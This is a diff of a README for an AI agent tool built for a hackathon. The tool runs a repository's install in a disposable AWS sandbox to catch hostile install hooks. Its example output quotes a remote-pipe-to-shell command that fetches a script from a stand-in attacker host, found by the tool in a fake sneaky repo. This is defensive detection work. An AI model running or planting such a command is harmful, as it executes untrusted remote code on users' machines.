@@ -12,7 +12,7 @@
 [![License: Apache-2.0](https://img.shields.io/badge/License-Apache%202.0-A855F7)](LICENSE)
 
 [![Watch the demo](https://img.shields.io/badge/▶%20Watch%20the%20demo-FF0000?logo=youtube&logoColor=white)](#-links)
-[![Live demo](https://img.shields.io/badge/🖥%20Live%20before%2Fafter%20toggle-8b7cff)](https://simplynadaf.github.io/repopilot-sandbox-tool/)
+[![Live demo](https://img.shields.io/badge/🖥%20Try%20the%20live%20demo-8b7cff)](https://simplynadaf.github.io/repopilot-sandbox-tool/)
 
 **🏗️ Built for the [AWS Builder Center Weekend Challenge: Give your Agent a Tool](https://builder.aws.com/build/hackathons/2e275689-b202-316e-93b8-10cd6d6d1e4a/weekend-challenge-give-your-agent-a-tool)**
 
@@ -25,20 +25,13 @@
 ---
 
 <div align="center">
-<em>Flip one toggle in the live demo and watch the agent go from guessing to proving.</em>
-<br/>
 
-```
- ┌─────────────────────────────────────────────────────────────────────┐
- │  BEFORE  ·  v1 (reads it)          │   AFTER  ·  v2 (runs it)         │
- ├────────────────────────────────────┼─────────────────────────────────┤
- │  reads README + files + metadata   │   runs install in a disposable   │
- │                                    │   AWS CodeBuild sandbox          │
- │  sneaky repo:                      │   sneaky repo:                   │
- │    "Looks fine."   ← the hook is   │    "⚠ caught: curl | bash in the │
- │     invisible to a reader          │     live log"  ← the real truth  │
- └────────────────────────────────────┴─────────────────────────────────┘
-```
+### The new tool, inside RepoPilot's own UI
+
+<em>RepoPilot scores the repo (the guess), then the <strong>new tool</strong> actually runs the install in a disposable AWS sandbox and catches the <code>curl | bash</code> the static scan never sees (the proof).</em>
+
+<img src="docs/ui-hero.png" alt="RepoPilot UI: an F-grade static scorecard, then the NEW TOOL panel runs the install in a disposable AWS CodeBuild sandbox and catches a curl-pipe-bash postinstall in the real log" width="720" />
+
 </div>
 
 ---
@@ -110,17 +103,17 @@ everything: it stops guessing and starts proving.
 
 ## 🎚️ Before / After (the whole point)
 
-The challenge asks you to show what your agent can do now that it could not before. The live
-demo makes that a single toggle: **v1 (reads it)** vs **v2 (runs it)**, on a safe repo and a
-sneaky one.
+The challenge asks you to show what your agent can do now that it could not before. It all
+happens in **one UI**: RepoPilot shows its static read first, then the new tool runs the
+install right below it, on a safe repo and a sneaky one.
 
-| Scenario | v1 · Before (reads it) | v2 · After (runs it in the sandbox) |
+| Scenario | Before · the static read (v1) | After · the new tool runs it (v2) |
 |---|---|---|
 | **Safe repo** (`pallets/click`) | "Looks safe. README and manifest agree." | **Ran it. Install SUCCEEDED. No danger in the live log.** |
-| **Sneaky `postinstall`** | "Looks fine." (the hook is invisible to a reader) | **⚠ Caught it: the install piped `curl ... \| bash` straight into a shell, seen in the real build log.** |
+| **Sneaky `postinstall`** (`evil/fake-agent-kit`) | "Looks fine." (the hook is invisible to a reader) | **⚠ Caught it: the install piped `curl ... \| bash` straight into a shell, seen in the real build log.** |
 
-Same agent, same repo, one new tool. v1 is a confident guess. v2 is the truth, because it
-actually pressed the button, in a box, so you did not have to.
+Same agent, same repo, one new tool. The static read is a confident guess. Running it is the
+truth, because it actually pressed the button, in a box, so you did not have to.
 
 ---
 
@@ -140,6 +133,10 @@ comes from running it somewhere disposable, and reading what it actually did.
 ---
 
 ## 🧠 How the Tool Works
+
+<div align="center">
+<img src="docs/architecture.png" alt="Architecture: RepoPilot's 5 static read-tools produce a 0-100 score (the guess); the new 6th tool run_in_sandbox starts an ephemeral AWS CodeBuild build with a least-privilege role, clones and runs the install, writes the real log to CloudWatch, and a danger scan over that real log produces the proven verdict" width="860" />
+</div>
 
 ```
  🧑 You: "is pallets/click safe to actually run?"
@@ -228,7 +225,7 @@ Each flag returns a `why` (plain English) and the exact `evidence` line from the
 | 🤖 Agent loop | [Strands Agents SDK](https://strandsagents.com) (`@tool`) |
 | 🧠 Reasoning | [Amazon Nova Pro](https://aws.amazon.com/ai/generative-ai/nova/) on Amazon Bedrock |
 | 🐍 Runtime | Python 3.11, `boto3` |
-| 🎨 Demo | single-file HTML, premium dark glass UI, a v1/v2 toggle, zero live calls |
+| 🎨 Demo | the real RepoPilot UI with the tool built in: score the repo, then click **Run it in a disposable AWS sandbox**; static replay, zero live calls |
 | ✅ Tests | 9 unit tests, no AWS needed (injectable client) |
 
 ---
@@ -272,7 +269,7 @@ run("pallets/click", "https://github.com/pallets/click", "pip install .")
   -> status: SUCCEEDED   install_ok: True   danger_signals: []   verified: True
 
 # Sneaky postinstall (install reaches the network)
-run("demo/sneaky-postinstall", ..., install that echoes a curl|bash)
+run("evil/fake-agent-kit", ..., install that echoes a curl|bash)
   -> status: SUCCEEDED   install_ok: True
      danger_signals: [ remote_pipe_to_shell :: "curl -s https://evil.example.com/i.sh | bash" ]
      verified: True
@@ -304,7 +301,10 @@ repopilot-sandbox-tool/
 │   ├── codebuild-trust.json        # CodeBuild assume-role
 │   └── codebuild-permissions.json  # least-privilege: CloudWatch Logs only
 └── docs/
-    ├── index.html                  # the before/after toggle demo (v1 reads / v2 runs)
+    ├── index.html                  # the real RepoPilot UI with the sandbox tool built in
+    ├── toggle.html                 # the earlier standalone before/after toggle (kept for reference)
+    ├── architecture.png            # how it works: the static read + the new sandbox-tool pipeline
+    ├── ui-hero.png                 # the UI catching a curl|bash in the live sandbox log
     └── replay-data.json            # real recorded run output for the static demo
 ```
 
@@ -361,7 +361,7 @@ No. It is a static replay of real recorded runs, so it makes zero AWS calls.
 ## 🔗 Links
 
 - ▶️ Demo video: _YouTube URL (added on publish)_
-- 🖥️ Live before/after toggle: https://simplynadaf.github.io/repopilot-sandbox-tool/
+- 🖥️ Live demo (the real UI, static replay): https://simplynadaf.github.io/repopilot-sandbox-tool/
 
 ---
 
